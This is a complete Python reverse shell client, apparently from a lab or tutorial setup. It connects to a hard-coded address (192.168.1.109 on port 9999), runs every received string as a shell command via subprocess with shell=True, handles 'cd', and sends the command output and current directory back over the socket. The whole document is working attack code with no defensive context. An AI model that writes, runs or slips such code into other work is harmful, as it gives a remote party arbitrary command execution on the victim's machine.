import socket
import os
import subprocess

s = socket.socket()
host = "192.168.1.109"
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd = subprocess.Popen(
            data[:].decode("utf-8"),
            shell=True,
            stdout=subprocess.PIPE,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        outputByte = cmd.stdout.read() + cmd.stderr.read()
        outputStr = str(outputByte, "utf-8")
        currentWD = os.getcwd() + ">"
        s.send(str.encode(outputStr + currentWD))

        print(outputStr)
